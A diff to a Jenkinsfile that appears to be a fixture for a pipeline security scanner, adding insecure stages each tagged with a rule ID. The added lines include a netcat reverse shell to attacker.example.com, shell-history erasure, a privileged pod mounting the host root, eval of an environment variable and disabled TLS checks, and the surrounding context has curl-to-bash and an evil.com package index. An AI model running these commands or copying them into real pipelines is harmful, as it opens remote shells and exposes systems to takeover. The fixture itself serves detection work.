@@ -34,6 +34,34 @@ pipeline {
                 // with no integrity check.
                 copyArtifacts(projectName: 'platform-build', filter: 'dist/*')
                 sh './dist/install.sh'
+                // JF-027 — archiveArtifacts without fingerprint: true.
+                archiveArtifacts artifacts: 'dist/*.jar'
+            }
+        }
+
+        // JF-025 — Kubernetes agent pod template with privileged mode
+        // and a hostPath mount (both escape vectors).
+        stage('Package on K8s') {
+            agent {
+                kubernetes {
+                    yaml '''
+apiVersion: v1
+kind: Pod
+spec:
+  containers:
+  - name: packager
+    image: debian:bullseye
+    securityContext:
+      privileged: true
+  volumes:
+  - name: host-root
+    hostPath:
+      path: /
+'''
+                }
+            }
+            steps {
+                sh 'make package'
             }
         }
 
@@ -48,6 +76,24 @@ pipeline {
             }
         }
 
+        // JF-024 — input step without a submitter restriction.
+        // JF-026 — fire-and-forget downstream trigger.
+        stage('Release to customers') {
+            steps {
+                input message: 'Promote to prod?'
+                build job: 'downstream-notify', wait: false, propagate: false
+            }
+        }
+
+        // JF-029 — evidence of malicious activity: shell-history erasure
+        // plus a netcat reverse-shell primitive.
+        stage('Cleanup') {
+            steps {
+                sh 'history -c && unset HISTFILE'
+                sh 'nc attacker.example.com 4444 -e /bin/sh'
+            }
+        }
+
         // JF-016 — curl piped to shell.
         // JF-017 — docker run --privileged.
         // JF-018 — pip install from insecure source.
@@ -58,6 +104,16 @@ pipeline {
                 sh 'curl https://example.com/setup.sh | bash'
                 sh 'docker run --privileged myimage'
                 sh 'pip install --index-url http://evil.com/simple/ pkg'
+                // JF-021: package install without lockfile enforcement.
+                sh 'npm install'
+                // JF-022: dependency update bypasses lockfile pins.
+                sh 'pip install --upgrade requests'
+                // JF-023: TLS verification bypass.
+                sh 'git config --global http.sslVerify false'
+                // JF-030: dangerous shell idiom — eval re-parses the value as shell.
+                sh 'eval "$BUILD_CMD"'
+                // JF-031: pip install from an unpinned git URL.
+                sh 'pip install git+https://example.com/internal/helper.git'
                 script {
                     def proc = Runtime.getRuntime().exec("id")
                 }
